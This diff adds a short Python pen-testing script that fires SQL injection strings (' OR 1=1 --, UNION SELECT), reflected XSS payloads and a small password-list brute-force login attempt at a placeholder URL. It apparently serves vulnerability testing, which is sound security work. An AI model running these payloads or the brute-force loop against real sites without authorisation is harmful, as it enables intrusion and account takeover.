@@ -1,0 +1,58 @@
+import requests
+from bs4 import BeautifulSoup
+
+# SQL Injection Test
+def test_sql_injection(url, param_name, payloads):
+    for payload in payloads:
+        injection_url = f"{url}?{param_name}={payload}"
+        response = requests.get(injection_url)
+        if "error" in response.text or "Warning" in response.text:
+            print(f"Possible SQL Injection found with payload: {payload}")
+            print(f"Response: {response.text}\n")
+
+# XSS Test
+def test_xss(url, param_name, payloads):
+    for payload in payloads:
+        xss_url = f"{url}?{param_name}={payload}"
+        response = requests.get(xss_url)
+        if payload in response.text:
+            print(f"Reflected XSS vulnerability found with payload: {payload}")
+            print(f"Response: {response.text}\n")
+
+# Brute Force Test (Insecure Authentication)
+def test_brute_force(url, username_field, password_field, username, password_list):
+    for password in password_list:
+        data = {
+            username_field: username,
+            password_field: password
+        }
+        response = requests.post(url, data=data)
+        if "Welcome" in response.text:
+            print(f"Login successful with username: {username} and password: {password}")
+            return
+        print(f"Failed login attempt with password: {password}")
+
+# Main function to run all tests
+def run_web_app_pen_testing(url):
+    # SQLi Testing
+    param_name = "id"
+    sqli_payloads = ["' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT NULL, NULL --"]
+    print("SQL Injection Testing...\n")
+    test_sql_injection(url, param_name, sqli_payloads)
+    
+    # XSS Testing
+    param_name = "search"
+    xss_payloads = ['<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>']
+    print("XSS Testing...\n")
+    test_xss(url, param_name, xss_payloads)
+    
+    # Brute Force Testing (Authentication)
+    username_field = "username"
+    password_field = "password"
+    username = "testuser"
+    password_list = ["12345", "password", "admin", "test123"]
+    print("Brute Force Login Testing...\n")
+    test_brute_force(url, username_field, password_field, username, password_list)
+
+# Run the penetration test on the target web application
+run_web_app_pen_testing("http://example.com/vulnerable_page")
